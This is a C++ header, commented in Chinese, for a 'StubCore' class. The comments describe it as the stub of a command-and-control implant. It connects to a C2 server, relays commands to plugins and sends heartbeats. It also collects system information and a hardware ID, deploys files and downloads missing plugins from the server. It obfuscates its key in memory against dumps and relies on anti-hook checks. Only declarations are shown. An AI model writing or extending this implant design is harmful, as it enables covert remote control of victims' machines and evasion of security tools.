#pragma once
#include "PluginLoader.h"
#include <string>
#include <atomic>
#include <thread>
#include <windows.h>
#include <wininet.h>

// ═══════════════════════════════════════════════
// Stub 核心 —— 只做三件事：
//   1. 连接 C2 服务端
//   2. 转发指令给 MCP 插件进程
//   3. 心跳保活
//
// 所有功能都在插件里，Stub 本身是干净的网络客户端
// ═══════════════════════════════════════════════

class StubCore {
public:
    StubCore();
    ~StubCore();

    void run(const std::wstring& pluginDir);

private:
    // 网络
    bool connectToServer();
    bool httpPost(const std::string& path, const std::string& body, std::string& response);
    std::string httpGet(const std::string& path);
    bool httpDownload(const std::string& url, const std::wstring& savePath);

    // 循环
    void pollLoop();
    void heartbeatLoop();

    // 信息采集
    std::string collectSystemInfo();
    std::string generateHWID();

    // 部署
    void handleDeployFile(const std::string& params);

    // 插件同步：从服务端拉取缺失的插件
    void syncPlugins(const std::wstring& pluginDir);

    // ── 密钥内存卫生（方案1）──
    // 存放密钥（混淆形态）；明文不留存
    void setAgentKeyPlain(const char* key);
    // 是否已配置密钥
    bool hasAgentKey() const { return !_agentKeyObf.empty(); }

    std::string _serverUrl;
    std::string _hwid;
    // ── 密钥内存卫生（方案1）──
    // 长驻内存的是 XOR 混淆形态（_agentKeyObf + 一次性掩码 _keyMask），
    // 明文只在构造请求头的瞬间解码到栈上，用完立即 SecureZeroMemory。
    // 防的是被动刮取（内存转储/扫描）；定点 hook 由 AntiHook 负责。
    std::string _agentKeyObf;   // key XOR mask 后的密文形态
    std::string _keyMask;       // 与 key 等长的随机掩码
    // 旧成员 _agentKey 已移除；如需判断密钥是否已配置用 hasAgentKey()
    PluginLoader _plugins;
    std::atomic<bool> _running{false};
    std::atomic<bool> _integrityCompromised{false}; // AntiHook 熔断：关键 API 被篡改时暂停指令执行
    std::thread _heartbeatThread;
    HINTERNET _hSession = nullptr;
};
